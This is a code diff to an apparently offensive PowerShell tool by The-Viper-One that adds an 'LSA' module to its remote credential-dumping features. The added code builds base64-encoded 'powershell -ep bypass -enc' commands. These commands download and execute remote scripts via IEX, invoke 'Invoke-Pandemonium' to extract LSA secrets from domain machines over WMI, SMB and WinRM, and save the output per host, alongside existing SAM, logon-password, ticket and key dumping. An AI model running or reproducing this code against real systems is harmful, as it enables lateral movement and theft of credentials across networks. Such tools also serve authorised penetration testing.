@@ -70,7 +70,7 @@ Write-Output $Banner
 Write-Host "Github  : " -ForegroundColor "Yellow" -NoNewline
 Write-Host "https://github.com/The-Viper-One"
 Write-Host "Version : " -ForegroundColor "Yellow" -NoNewline
-Write-Host "0.0.7"
+Write-Host "0.0.8"
 Write-Host
 
 
@@ -176,6 +176,7 @@ $LogonPasswords = Join-Path $PME "LogonPasswords"
 $SMB = Join-Path $PME "SMB"
 $Tickets = Join-Path $PME "Tickets"
 $ekeys = Join-Path $PME "eKeys"
+$LSA = Join-Path $PME "LSA"
 
   if (-not (Test-Path $PME)) {
     New-Item -ItemType Directory -Force -Path $PME  | Out-Null
@@ -216,6 +217,12 @@ $ekeys = Join-Path $PME "eKeys"
     New-Item -ItemType Directory -Force -Path $ekeys  | Out-Null
     Write-Host "[+] " -ForegroundColor "Green"   -NoNewline
     Write-Host "Created directory for eKeys at $eKeys"
+}
+
+  if (-not (Test-Path $LSA)){
+    New-Item -ItemType Directory -Force -Path $LSA  | Out-Null
+    Write-Host "[+] " -ForegroundColor "Green"   -NoNewline
+    Write-Host "Created directory for LSA at $LSA"
 }
 
 ######### Checks if user context is administrative when a session is spawned #########
@@ -526,6 +533,13 @@ $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicod
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
 
+# LSA
+elseif ($Module -eq "LSA"){
+$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX(New-Object System.Net.WebClient).DownloadString(""$MongooseURL"")}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""LSA"""
+$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
+$Command = "powershell.exe -ep bypass -enc $base64command"
+}
+
 # SAM
 elseif ($Module -eq "SAM"){
 $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX(New-Object System.Net.WebClient).DownloadString(""$MongooseURL"")}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$DumpSAMURL"")"
@@ -577,7 +591,7 @@ $WMIJobs = @()
     $OS = $computer.Properties["operatingSystem"][0]
     $ComputerName = $computer.Properties["dnshostname"][0]
         $ScriptBlock = {
-            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName, $NameLength, $OSLength)
+            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName, $NameLength, $OSLength, $LSA)
             $Class = "PMEClass"
 
     $tcpClient = New-Object System.Net.Sockets.TcpClient -ErrorAction SilentlyContinue
@@ -727,6 +741,12 @@ function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
              elseif ($Module -eq "ekeys" -and $Option -eq "Parse"){
              $result | Out-File -FilePath "$eKeys\$ComputerName-eKeys.txt" -Encoding "ASCII"
              }
+
+             elseif ($Module -eq "lsa"){
+             Write-Host "LSA Secrets written to $LSA\$ComputerName-LSA.txt" -ForegroundColor "Cyan"
+             $result | Out-File -FilePath "$LSA\$ComputerName-LSA.txt" -Encoding "ASCII"
+             Write-Host
+             }
              
              elseif ($Commmand -ne ""){
              $result | Write-host
@@ -763,7 +783,7 @@ elseif (!$osinfo){
             Start-Sleep -Milliseconds 500
         }
 
-        $WMIJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName,  $NameLength, $OSLength
+        $WMIJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName,  $NameLength, $OSLength, $LSA
         [array]$WMIJobs += $WMIJob
 
         # Check if the maximum number of concurrent jobs has been reached
@@ -820,7 +840,7 @@ $ErrorActionPreference = "SilentlyContinue"
     $OS = $computer.Properties["operatingSystem"][0]
     $ComputerName = $computer.Properties["dnshostname"][0]
         $ScriptBlock = {
-            Param($Option,$Computer, $Domain, $Command, $Module ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $ekeys, $PSexecURL, $OS, $ComputerName, $NameLength, $OSLength)
+            Param($Option,$Computer, $Domain, $Command, $Module ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $ekeys, $PSexecURL, $OS, $ComputerName, $NameLength, $OSLength, $LSA)
             $tcpClient = New-Object System.Net.Sockets.TcpClient
             $asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
             $wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
@@ -1058,7 +1078,7 @@ $a = Invoke-ServiceExec -ComputerName $ComputerName -Command $Command | Out-stri
             Start-Sleep -Milliseconds 500
         }
 
-        $PsexecJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option,$Computer, $Domain, $Command, $Module ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $ekeys, $PSexecURL, $OS, $ComputerName, $NameLength, $OSLength
+        $PsexecJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option,$Computer, $Domain, $Command, $Module ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $ekeys, $PSexecURL, $OS, $ComputerName, $NameLength, $OSLength, $LSA
         [array]$PSexecJobs += $PsexecJob
 
         # Check if the maximum number of concurrent jobs has been reached
@@ -1116,7 +1136,7 @@ $ErrorActionPreference = "SilentlyContinue"
     $OS = $computer.Properties["operatingSystem"][0]
     $ComputerName = $computer.Properties["dnshostname"][0]
         $ScriptBlock = {
-            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength)
+            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength, $LSA)
             $tcpClient = New-Object System.Net.Sockets.TcpClient
             $asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
             $wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
@@ -1157,28 +1177,40 @@ $ErrorActionPreference = "SilentlyContinue"
                         Write-Host
                         $b | Out-File -FilePath "$SAM\$ComputerName-SAMHashes.txt" -Encoding "ASCII"
                     }
+                    
                     elseif (($Module -eq "LogonPasswords") -or ($Module -eq "LogonPasswords" -and $Option -eq "Parse")) {
                         $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
                         $b | Write-host
                         Write-Host
                         $b | Out-File -FilePath "$LogonPasswords\$ComputerName-RAW.txt" -Encoding "ASCII"
                     }
+                    
                     elseif ($Module -eq "Tickets") {
                         $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
                         Write-Host "Tickets written to $Tickets\$ComputerName.txt" -ForegroundColor "Cyan"
                         Write-Host
                         $b | Out-File -FilePath "$Tickets\$ComputerName-Tickets.txt" -Encoding "ASCII"
                     }
+                    
                     elseif ($Module -eq "ekeys" -and $Option -ne "Parse") {
                         $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
                         $b | Write-Host
                         Write-Host
                         $b | Out-File -FilePath "$eKeys\$ComputerName-eKeys.txt" -Encoding "ASCII"
                     }
+                    
                     elseif ($Module -eq "ekeys" -and $Option -eq "Parse") {
                         $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
                         $b | Out-File -FilePath "$eKeys\$ComputerName-eKeys.txt" -Encoding "ASCII"
                     }
+                    
+                    elseif ($Module -eq "LSA") {
+                        $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
+                        Write-Host "LSA Secrets written to $LSA\$ComputerName-LSA.txt" -ForegroundColor "Cyan"
+                        Write-Host
+                        $b | Out-File -FilePath "$LSA\$ComputerName-LSA.txt" -Encoding "ASCII"
+                    }
+                   
                     elseif ($Module -eq "Interactive") {
                         Start-Process powershell.exe -ArgumentList '-noexit -Command', "Enter-PSSession -ComputerName $ComputerName" -ErrorAction "Ignore"
                     }
@@ -1227,7 +1259,7 @@ $ErrorActionPreference = "SilentlyContinue"
             Start-Sleep -Milliseconds 500
         }
 
-        $WinRMJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength
+        $WinRMJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength, $LSA
         [array]$WinRMJobs += $WinRMJob
 
         # Check if the maximum number of concurrent jobs has been reached
